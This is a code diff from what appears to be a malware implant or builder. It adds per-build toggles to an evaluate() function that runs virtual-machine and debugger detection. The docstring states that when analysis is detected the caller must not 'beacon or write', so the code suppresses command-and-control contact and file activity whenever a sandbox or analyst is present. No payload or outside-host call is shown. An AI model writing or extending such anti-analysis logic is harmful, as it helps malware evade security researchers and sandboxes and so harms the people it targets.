@@ -143,16 +143,30 @@ def debug_signals() -> dict:
     return sig
 
 
-def evaluate() -> dict:
-    """Aggregate verdict. analysis=True => caller must NOT beacon or write."""
-    v = vm_signals()
-    d = debug_signals()
+def evaluate(cfg: dict | None = None) -> dict:
+    """Aggregate verdict. analysis=True => caller must NOT beacon or write.
+
+    Honors per-build toggles so a build can enable VM checks but skip debugger
+    checks (or vice-versa). With no cfg, all checks run (legacy default).
+      opts.anti_vm       -> vm_signals()
+      opts.anti_debug    -> debug_signals()
+      opts.anti_analysis -> both, plus the low-resource heuristic
+    """
+    opts = (cfg or {}).get("opts", {})
+    do_vm = opts.get("anti_vm", True) if opts else True
+    do_dbg = opts.get("anti_debug", True) if opts else True
+    do_all = opts.get("anti_analysis", False) if opts else False
+    if do_all:
+        do_vm = do_dbg = True
+
+    v = vm_signals() if (do_vm or do_all) else {}
+    d = debug_signals() if (do_dbg or do_all) else {}
     strong = sum([
         v.get("wmi_model", False), v.get("wmi_bios", False),
         v.get("disk_model", False), v.get("mac_oui", False),
         d.get("is_debugger", False), d.get("tool_proc", False),
     ])
-    weak = sum([v.get("low_cpu", False)])
+    weak = sum([v.get("low_cpu", False)]) if do_all else 0
     return {
         "vm": v, "debug": d,
         "analysis": strong >= 1 or (strong == 0 and weak >= 2),
